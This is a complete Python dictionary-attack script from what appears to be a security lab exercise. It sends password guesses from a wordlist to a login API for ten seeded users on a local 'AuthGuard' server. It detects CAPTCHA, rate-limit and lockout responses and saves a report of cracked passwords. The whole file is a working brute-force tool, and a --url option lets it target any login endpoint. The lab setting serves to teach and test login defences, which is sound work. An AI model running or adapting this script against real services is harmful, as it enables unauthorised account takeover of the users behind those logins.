#!/usr/bin/env python3
"""
Dictionary attack against ALL seeded users on the AuthGuard server.

Target : http://localhost:3000/api/login  (POST)
Body   : {"username": "<user>", "password": "<guess>"}

Usage:
    python brute_force.py                   # attack defended server
    python brute_force.py --delay 0         # full speed
    python brute_force.py --url http://localhost:3000/api/login
"""

import requests
import time
import argparse
import sys
import os
from datetime import datetime

# ---------------------------------------------------------------------------
# Defaults
# ---------------------------------------------------------------------------
DEFAULT_URL      = "http://localhost:3000/api/login"
DEFAULT_WORDLIST = os.path.join(os.path.dirname(__file__), "wordlist.txt")
REQUEST_DELAY    = 0.05

TARGET_USERS = [
    "alice", "bob", "charlie", "diana", "eve",
    "frank", "grace", "henry", "isabella", "jack",
]

# ---------------------------------------------------------------------------
# Terminal colours
# ---------------------------------------------------------------------------
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"


def banner():
    print(f"""
{CYAN}{BOLD}╔══════════════════════════════════════════════╗
║       Online Brute-Force Attack Tool         ║
║       IS Security Lab — Phase 2 / 4         ║
║       Mode: ALL USERS — one shot             ║
╚══════════════════════════════════════════════╝{RESET}
""")


def load_wordlist(path: str) -> list[str]:
    if not os.path.exists(path):
        print(f"{RED}[!] Wordlist not found: {path}{RESET}")
        sys.exit(1)
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        words = [line.strip() for line in f if line.strip()]
    print(f"[*] Loaded {len(words)} passwords from {path}")
    return words


def classify_response(status_code: int, message: str) -> str:
    """Return which defense (if any) blocked this attempt."""
    msg = message.lower()
    if status_code == 429 or "too many requests" in msg or "wait 1 minute" in msg:
        return "rate_limit"
    if status_code == 403 or "locked" in msg:
        return "lockout"
    if "captcha" in msg:
        return "captcha"
    return "none"


def try_login(session: requests.Session, url: str, username: str, password: str):
    """
    Send one login attempt.
    Returns (success: bool, status_code: int, defense: str, message: str).
    """
    try:
        resp = session.post(
            url,
            json={"username": username, "password": password},
            timeout=10,
        )
        data = {}
        if "application/json" in resp.headers.get("content-type", ""):
            data = resp.json()

        success = resp.status_code == 200 and bool(data.get("success"))
        message = data.get("message", "")
        defense = classify_response(resp.status_code, message) if not success else "none"
        return success, resp.status_code, defense, message

    except requests.exceptions.ConnectionError:
        print(f"\n{RED}[!] Connection refused — is the server running?")
        print(f"    Start it:  cd authguard && node server.js{RESET}")
        sys.exit(1)
    except requests.exceptions.Timeout:
        return False, 0, "none", "timeout"
    except Exception as exc:
        print(f"\n{RED}[!] Error: {exc}{RESET}")
        return False, 0, "none", str(exc)


def attack_user(session, url, username, wordlist, delay) -> dict:
    """Try every password against one username. Stops on success or hard block."""
    found_password = None
    stopped_by     = None   # "captcha" | "rate_limit" | "lockout" | None
    stopped_at     = None
    attempts       = 0

    for password in wordlist:
        attempts += 1
        print(f"\r  [{username:<10}] attempt {attempts:>4}/{len(wordlist)}  "
              f"testing '{password}' ...", end="", flush=True)

        success, status_code, defense, message = try_login(session, url, username, password)

        if success:
            found_password = password
            print(f"\r  {GREEN}{BOLD}[CRACKED]  {username:<10} => '{password}' "
                  f"(attempt #{attempts}){RESET}")
            break

        if defense == "captcha":
            stopped_by = "captcha"
            stopped_at = attempts
            print(f"\r  {YELLOW}[CAPTCHA]  {username:<10}  blocked at attempt #{attempts} "
                  f"— CAPTCHA required{RESET}                    ")
            break

        if defense == "rate_limit":
            stopped_by = "rate_limit"
            stopped_at = attempts
            print(f"\r  {YELLOW}[RATE LIM] {username:<10}  blocked at attempt #{attempts} "
                  f"— rate limit hit{RESET}                    ")
            break

        if defense == "lockout":
            stopped_by = "lockout"
            stopped_at = attempts
            print(f"\r  {YELLOW}[LOCKOUT]  {username:<10}  blocked at attempt #{attempts} "
                  f"— account locked{RESET}                    ")
            break

        if delay > 0:
            time.sleep(delay)

    if not found_password and not stopped_by:
        print(f"\r  {RED}[FAILED]   {username:<10}  not found in wordlist{RESET}          ")

    return {
        "username":   username,
        "attempts":   attempts,
        "found":      found_password,
        "stopped_by": stopped_by,
        "stopped_at": stopped_at,
    }


def run_attack(url, users, wordlist, delay) -> tuple:
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (BruteForceBot/1.0)"})

    print(f"\n{BOLD}Target URL  :{RESET} {url}")
    print(f"{BOLD}Users       :{RESET} {', '.join(users)}")
    print(f"{BOLD}Passwords   :{RESET} {len(wordlist)}")
    print(f"{BOLD}Delay/req   :{RESET} {delay}s")
    print("=" * 56)

    results    = []
    start_time = time.time()

    for i, username in enumerate(users, 1):
        print(f"\n[{i}/{len(users)}] Attacking: {BOLD}{username}{RESET}")
        result = attack_user(session, url, username, wordlist, delay)
        results.append(result)

    elapsed = time.time() - start_time

    cracked      = [r for r in results if r["found"]]
    captcha_hit  = [r for r in results if r["stopped_by"] == "captcha"]
    lockout_hit  = [r for r in results if r["stopped_by"] == "lockout"]
    ratelim_hit  = [r for r in results if r["stopped_by"] == "rate_limit"]
    failed       = [r for r in results if not r["found"] and not r["stopped_by"]]
    total_att    = sum(r["attempts"] for r in results)

    print(f"\n\n{CYAN}{BOLD}{'='*56}")
    print("              FULL ATTACK SUMMARY")
    print(f"{'='*56}{RESET}")
    print(f"  Target URL     : {url}")
    print(f"  Users targeted : {len(users)}")
    print(f"  Total attempts : {total_att}")
    print(f"  Time elapsed   : {elapsed:.2f}s")
    print()

    if cracked:
        print(f"  {GREEN}{BOLD}CRACKED ({len(cracked)}/{len(users)}):{RESET}")
        for r in cracked:
            print(f"    {GREEN}+  {r['username']:<12} => '{r['found']}'  (#{r['attempts']}){RESET}")

    if captcha_hit:
        print(f"\n  {YELLOW}CAPTCHA BLOCKED ({len(captcha_hit)}/{len(users)}):{RESET}")
        for r in captcha_hit:
            print(f"    {YELLOW}!  {r['username']:<12} stopped at attempt #{r['stopped_at']}{RESET}")

    if lockout_hit:
        print(f"\n  {YELLOW}ACCOUNT LOCKED ({len(lockout_hit)}/{len(users)}):{RESET}")
        for r in lockout_hit:
            print(f"    {YELLOW}!  {r['username']:<12} locked at attempt #{r['stopped_at']}{RESET}")

    if ratelim_hit:
        print(f"\n  {YELLOW}RATE LIMITED ({len(ratelim_hit)}/{len(users)}):{RESET}")
        for r in ratelim_hit:
            print(f"    {YELLOW}!  {r['username']:<12} blocked at attempt #{r['stopped_at']}{RESET}")

    if failed:
        print(f"\n  {RED}NOT FOUND ({len(failed)}/{len(users)}):{RESET}")
        for r in failed:
            print(f"    {RED}-  {r['username']}{RESET}")

    print(f"\n{CYAN}{BOLD}{'='*56}{RESET}\n")

    report_path = save_report(url, users, wordlist, results, total_att, elapsed)
    return results, elapsed, report_path


def save_report(url, users, wordlist, results, total_attempts, elapsed):
    reports_dir = os.path.join(os.path.dirname(__file__), "reports")
    os.makedirs(reports_dir, exist_ok=True)

    timestamp   = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    report_path = os.path.join(reports_dir, f"attack_{timestamp}.txt")

    cracked     = [r for r in results if r["found"]]
    captcha_hit = [r for r in results if r["stopped_by"] == "captcha"]
    lockout_hit = [r for r in results if r["stopped_by"] == "lockout"]
    ratelim_hit = [r for r in results if r["stopped_by"] == "rate_limit"]
    failed      = [r for r in results if not r["found"] and not r["stopped_by"]]

    lines = [
        "=" * 56,
        "     IS SECURITY LAB — BRUTE FORCE ATTACK REPORT",
        "=" * 56,
        f"  Date/Time      : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"  Target URL     : {url}",
        f"  Users targeted : {len(users)}",
        f"  Wordlist size  : {len(wordlist)} passwords",
        f"  Total attempts : {total_attempts}",
        f"  Time elapsed   : {elapsed:.2f}s",
        f"  Avg per user   : {elapsed / len(users):.2f}s",
        "",
        "-" * 56,
        f"  CRACKED        : {len(cracked)}/{len(users)} accounts",
        f"  CAPTCHA BLOCK  : {len(captcha_hit)}/{len(users)} accounts",
        f"  LOCKOUT BLOCK  : {len(lockout_hit)}/{len(users)} accounts",
        f"  RATE LIM BLOCK : {len(ratelim_hit)}/{len(users)} accounts",
        f"  NOT FOUND      : {len(failed)}/{len(users)} accounts",
        "-" * 56,
        "",
    ]

    for r in results:
        if r["found"]:
            status = f"CRACKED — password: '{r['found']}'"
        elif r["stopped_by"] == "captcha":
            status = f"BLOCKED by CAPTCHA at attempt #{r['stopped_at']}"
        elif r["stopped_by"] == "lockout":
            status = f"BLOCKED by lockout at attempt #{r['stopped_at']}"
        elif r["stopped_by"] == "rate_limit":
            status = f"BLOCKED by rate limit at attempt #{r['stopped_at']}"
        else:
            status = "NOT FOUND"
        lines.append(f"  {r['username']:<12} | attempts: {r['attempts']:>3} | {status}")

    lines += ["", "=" * 56]

    with open(report_path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))

    print(f"[*] Report saved → {report_path}\n")
    return report_path


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="Dictionary attack against all AuthGuard test users.")
    parser.add_argument("--url",      default=DEFAULT_URL)
    parser.add_argument("--wordlist", default=DEFAULT_WORDLIST)
    parser.add_argument("--delay",    type=float, default=REQUEST_DELAY)
    args = parser.parse_args()

    banner()
    wordlist = load_wordlist(args.wordlist)
    run_attack(args.url, TARGET_USERS, wordlist, args.delay)


if __name__ == "__main__":
    main()
